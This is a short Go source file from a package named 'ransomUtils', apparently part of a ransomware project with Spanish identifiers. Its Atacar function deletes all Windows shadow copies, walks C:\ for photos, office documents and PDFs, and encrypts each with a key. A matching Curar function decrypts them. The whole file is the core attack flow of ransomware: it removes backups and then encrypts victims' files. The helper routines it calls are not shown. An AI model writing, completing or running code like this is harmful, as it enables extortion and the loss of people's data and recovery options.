package ransomUtils

import (
	"fmt"
)

func Atacar(key string) string {
	resumen := ""

	resultInfo, errShadowCopies := DeleteAllShadowCopies()
	if errShadowCopies != nil {
		resumen += fmt.Sprintf("Error: %v\n", errShadowCopies)
	}
	resumen += resultInfo + "\n"

	files, errListFiles := ListFiles(`C:\`, []string{"jpg", "jpeg", "png", "gif", "docx", "xlsx", "pptx", "pdf"})
	if errListFiles != nil {
		resumen += fmt.Sprintf("Error: %v\n", errListFiles)
		return resumen
	}

	resumen += "Cifrando los ficheros:\n"
	for _, file := range files {
		errEncrypt := EncryptFile(file, key)
		if errEncrypt != nil {
			resumen += fmt.Sprintf("Error encriptando %s: %v\n", file, errEncrypt)
		} else {
			resumen += file + "\n"
		}
	}

	return resumen
}

func Curar(key string) string {
	resumen := ""

	files, errListFiles := ListFiles(`C:\`, []string{"jpg", "jpeg", "png", "gif", "docx", "xlsx", "pptx", "pdf"})
	if errListFiles != nil {
		resumen += fmt.Sprintf("Error: %v\n", errListFiles)
		return resumen
	}

	resumen += "Descifrando los ficheros:\n"
	for _, file := range files {
		errDecrypt := DecryptFile(file, key)
		if errDecrypt != nil {
			resumen += fmt.Sprintf("Error descifrando %s: %v\n", file, errDecrypt)
		} else {
			resumen += file + "\n"
		}
	}

	return resumen
}
